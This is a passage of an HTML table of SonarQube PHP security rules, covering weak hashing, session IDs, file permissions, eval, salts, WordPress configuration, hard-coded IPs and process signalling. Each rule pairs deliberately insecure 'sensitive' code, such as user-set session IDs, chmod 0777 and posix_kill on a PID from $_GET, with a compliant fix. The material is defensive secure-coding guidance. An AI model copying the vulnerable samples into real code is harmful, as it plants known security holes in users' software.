        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2070">
              php:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=php%3AS4790&rule_key=php%3AS4790'>S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
$password = ...

if (md5($password) === '1f3870be274f6c49b3e31a0c6728957f') { // Noncompliant; md5() hashing algorithm is not secure for password management
   [...]
}

if (sha1($password) === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') { // Noncompliant; sha1() hashing algorithm is not secure for password management
   [...]
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/328">CWE-328 - Reversible One-Way Hash</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2964">
              php:S2964
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>sleep</code> is sometimes used in a mistaken attempt to prevent Denial of Service (DoS) attacks by throttling response rate. But because it
ties up a thread, each request takes longer to serve that it otherwise would, making the application <em>more</em> vulnerable to DoS attacks, rather
than less.</p>
<h3>Noncompliant code example</h3>
<pre>
if (is_bad_ip($requester)) {
  sleep(5);  // Noncompliant
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5328">
              php:S5328
            </a>
          </td>
          <td>
            <details>
              <p>If a session ID can be guessed (not generated with a secure pseudo random generator, or with insufficient length …​) an attacker may be able to
hijack another user’s session.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the session ID is not unique. </li>
  <li> the session ID is set from a user-controlled input. </li>
  <li> the session ID is generated with not secure pseudo random generator. </li>
  <li> the session ID length is too short. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t manually generate session IDs, use instead language based native functionality.</p>
<h2>Sensitive Code Example</h2>
<pre>
session_id(bin2hex(random_bytes(4))); // Sensitive: 4 bytes is too short
session_id($_POST["session_id"]); // Sensitive: session ID can be specified by the user
</pre>
<h2>Compliant Solution</h2>
<pre>
session_regenerate_id(); ; // Compliant
session_id(bin2hex(random_bytes(16))); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Session_fixation">OWASP Sesssion Fixation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/340">CWE-340 - Generation of Predictable Numbers or Identifiers</a> </li>
  <li> <a href="https://www.php.net/random-bytes">PHP: random_bytes()</a> </li>
  <li> <a href="https://www.php.net/session-regenerate-id">PHP: session_regenerate_id()</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2612">
              php:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<pre>
chmod("foo", 0777); // Sensitive
</pre>
<pre>
umask(0); // Sensitive
umask(0750); // Sensitive
</pre>
<p>For <a href="https://symfony.com/doc/current/components/filesystem.html">Symfony Filesystem</a>:</p>
<pre>
use Symfony\Component\Filesystem\Filesystem;

$fs = new Filesystem();
$fs-&gt;chmod("foo", 0777); // Sensitive
</pre>
<p>For <a href="https://laravel.com/api/8.x/Illuminate/Filesystem/Filesystem.html">Laravel Filesystem</a>:</p>
<pre>
use Illuminate\Filesystem\Filesystem;

$fs = new Filesystem();
$fs-&gt;chmod("foo", 0777); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
chmod("foo", 0750); // Compliant
</pre>
<pre>
umask(0027); // Compliant
</pre>
<p>For <a href="https://symfony.com/doc/current/components/filesystem.html">Symfony Filesystem</a>:</p>
<pre>
use Symfony\Component\Filesystem\Filesystem;

$fs = new Filesystem();
$fs-&gt;chmod("foo", 0750); // Compliant
</pre>
<p>For <a href="https://laravel.com/api/8.x/Illuminate/Filesystem/Filesystem.html">Laravel Filesystem</a>:</p>
<pre>
use Illuminate\Filesystem\Filesystem;

$fs = new Filesystem();
$fs-&gt;chmod("foo", 0750); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S1523">
              php:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807">CVE-2017-9807</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802">CVE-2017-9802</a> </li>
</ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a
href="https://owasp.org/www-community/attacks/Code_Injection">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule marks for review each occurrence of the <a href="https://www.php.net/manual/en/function.eval.php"><code>eval</code> function</a>. This
rule does not detect code injections. It only highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>
  <li> you really need to run code dynamically. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager">Security Managers</a> in java, <a
href="https://www.w3schools.com/tags/att_iframe_sandbox.asp">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
eval($code_to_be_dynamically_executed)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2053">
              php:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a "salt," is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h3>Exceptions</h3>
<p>To securely store password hashes, it is a recommended to rely on key derivation functions that are computationally intensive. Examples of such
functions are:</p>
<ul>
  <li> Argon2 </li>
  <li> PBKDF2 </li>
  <li> Scrypt </li>
  <li> Bcrypt </li>
</ul>
<p>When they are used for password storage, using a secure, random salt is required.</p>
<p>However, those functions can also be used for other purposes such as master key derivation or password-based pre-shared key generation. In those
cases, the implemented cryptographic protocol might require using a fixed salt to derive keys in a deterministic way. In such cases, using a fixed
salt is safe and accepted.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$salt = 'salty';
$hash = hash_pbkdf2('sha256', $password, $salt, 100000); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$salt = random_bytes(16);
$hash = hash_pbkdf2('sha256', $password, $salt, 100000);
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>random_bytes</code> function with a
length parameter set to 16. This one internally uses a cryptographically secure pseudo random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/759">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/760">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6348">
              php:S6348
            </a>
          </td>
          <td>
            <details>
              <p>By default, the WordPress administrator and editor roles can add unfiltered HTML content in various places, such as post content. This includes the
capability to add JavaScript code.</p>
<p>If an account with such a role gets hijacked, this capability can be used to plant malicious JavaScript code that gets executed whenever somebody
visits the website.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You really need the possibility to add unfiltered HTML with editor or administrator roles. </li>
  <li> There’s a chance that the accounts of authorized users get compromised. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The <code>unfiltered_html</code> capability should be granted to trusted roles that need to use markup when publishing dynamic content to the
WordPress website. If this capability is not required for all users, including administrators and editors roles, then it’s recommended to set
<code>DISALLOW_UNFILTERED_HTML</code> to <code>true</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
define( 'DISALLOW_UNFILTERED_HTML', false ); // sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( 'DISALLOW_UNFILTERED_HTML', true );
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6345">
              php:S6345
            </a>
          </td>
          <td>
            <details>
              <p>External requests initiated by a WordPress server should be considered as security-sensitive. They may contain sensitive data which is stored in
the files or in the database of the server. It’s important for the administrator of a WordPress server to understand what they contain and to which
server they are sent.</p>
<p>WordPress makes it possible to block external requests by setting the <code>WP_HTTP_BLOCK_EXTERNAL</code> option to <code>true</code>. It’s then
possible to authorize requests to only a few servers using another option named <code>WP_ACCESSIBLE_HOSTS</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Your WordPress website contains code which may call external requests to servers you don’t know. </li>
  <li> Your WordPress website may send sensitive data to other servers. </li>
  <li> Your WordPress website uses a lot of plugins or themes. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Uninstall WordPress plugins which send requests to servers you don’t know. </li>
  <li> Make sure that <code>WP_HTTP_BLOCK_EXTERNAL</code> is defined in <code>wp-config.php</code>. </li>
  <li> Make sure that <code>WP_HTTP_BLOCK_EXTERNAL</code> is set to <code>true</code>. </li>
  <li> Make sure that <code>WP_ACCESSIBLE_HOSTS</code> is configured to authorize requests to the servers you trust. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
define( 'WP_HTTP_BLOCK_EXTERNAL', false ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( 'WP_HTTP_BLOCK_EXTERNAL', true );
define( 'WP_ACCESSIBLE_HOSTS', 'api.wordpress.org' );
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#block-external-url-requestsl">wordpress.org</a> - Block External URL
  Requests </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6346">
              php:S6346
            </a>
          </td>
          <td>
            <details>
              <p>WordPress has a database repair and optimization mode that can be activated by setting <code>WP_ALLOW_REPAIR</code> to <code>true</code> in the
configuration.</p>
<p>If activated, the repair page can be accessed by any user, authenticated or not. This makes sense because if the database is corrupted, the
authentication mechanism might not work.</p>
<p>Malicious users could trigger this potentially costly operation repeatadly slowing down the website, and making it unavailable.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database is not currently corrupted. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable automatic database repair mode only in case of database corruption. This feature should be deactivated again when the
database issue is resolved.</p>
<h2>Sensitive Code Example</h2>
<pre>
define( 'WP_ALLOW_REPAIR', true ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// The default value is false, so the value does not have to be expilicitly set.
define( 'WP_ALLOW_REPAIR', false );
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#automatic-database-optimizing">wordpress.org</a> - Automatic Database
  Optimizing </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6341">
              php:S6341
            </a>
          </td>
          <td>
            <details>
              <p>WordPress makes it possible to edit theme and plugin files directly in the Administration Screens. While it may look like an easy way to customize
a theme or do a quick change, it’s a dangerous feature. When visiting the theme or plugin editor for the first time, WordPress displays a warning to
make it clear that using such a feature may break the web site by mistake. More importantly, users who have access to this feature can trigger the
execution of any PHP code and may therefore take full control of the WordPress instance. This security risk could be exploited by an attacker who
manages to get access to one of the authorized users. Setting the <code>DISALLOW_FILE_EDIT</code> option to <code>true</code> in
<code>wp-config.php</code> disables this risky feature. The default value is <code>false</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You really need to use the theme and plugin editors. </li>
  <li> The theme and plugin editors are available to users who cannot be fully trusted. </li>
  <li> There’s a chance that the accounts of authorized users get compromised. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Modify the theme and plugin files using a local editor and deploy them to the server in a secure way. </li>
  <li> Make sure that <code>DISALLOW_FILE_EDIT</code> is defined in <code>wp-config.php</code>. </li>
  <li> Make sure that <code>DISALLOW_FILE_EDIT</code> is set to <code>true</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
define( 'DISALLOW_FILE_EDIT', false ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( 'DISALLOW_FILE_EDIT', true );
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#disable-the-plugin-and-theme-editor">wordpress.org</a> - Disable the
  Plugin and Theme Editor </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/94">CWE-94 - Improper Control of Generation of Code ('Code Injection')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6343">
              php:S6343
            </a>
          </td>
          <td>
            <details>
              <p>Automatic updates are a great way of making sure your application gets security updates as soon as they are available. Once a vendor releases a
security update, it is crucial to apply it in a timely manner before malicious actors exploit the vulnerability. Relying on manual updates is usually
too late, especially if the application is publicly accessible on the internet.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is no specific reason for deactivating all automatic updates. </li>
  <li> you meant to deactivate only automatic major updates. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t deactivate automatic updates unless you have a good reason to do so. This way, you’ll be sure to receive security updates as soon as they are
available. If you are worried about an automatic update breaking something, check if it is possible to only activate automatic updates for minor or
security updates.</p>
<h2>Sensitive Code Example</h2>
<pre>
define( 'WP_AUTO_UPDATE_CORE', false ); // Sensitive
define( 'AUTOMATIC_UPDATER_DISABLED', true ); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
define( 'WP_AUTO_UPDATE_CORE', true ); // Minor and major automatic updates enabled
define( 'WP_AUTO_UPDATE_CORE', 'minor' ); // Only minor updates are enabled
define( 'AUTOMATIC_UPDATER_DISABLED', false );
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#disable-wordpress-auto-updates">Wordpress.org</a> - Disable WordPress
  Auto Updates </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S1313">
              php:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, '8.8.8.8', 23);  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, IP_ADDRESS, 23);  // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4828">
              php:S4828
            </a>
          </td>
          <td>
            <details>
              <p>Signaling processes or process groups can seriously affect the stability of this application or other applications on the same system.</p>
<p>Accidentally setting an incorrect <code>PID</code> or <code>signal</code> or allowing untrusted sources to assign arbitrary values to these
parameters may result in a denial of service.</p>
<p>Also, the system treats the signal differently if the destination <code>PID</code> is less than or equal to 0. This different behavior may affect
multiple processes with the same (E)UID simultaneously if the call is left uncontrolled.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The parameters <code>pid</code> and <code>sig</code> are untrusted (they come from an external source). </li>
  <li> This function is triggered by non-administrators. </li>
  <li> Signal handlers on the target processes stop important functions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For stateful applications with user management, ensure that only administrators trigger this code. </li>
  <li> Verify that the <code>pid</code> and <code>sig</code> parameters are correct before using them. </li>
  <li> Ensure that the process sending the signals runs with as few OS privileges as possible. </li>
  <li> Isolate the process on the system based on its (E)UID. </li>
  <li> Ensure that the signal does not interrupt any essential functions when intercepted by a target’s signal handlers. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
$targetPid = (int)$_GET["pid"];
posix_kill($targetPid, 9); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$targetPid = (int)$_GET["pid"];

// Validate the untrusted PID,
// With a pre-approved list or authorization checks
if (isValidPid($targetPid)) {
    posix_kill($targetPid, 9);
}
</pre>
<h2>See</h2>
<ul>
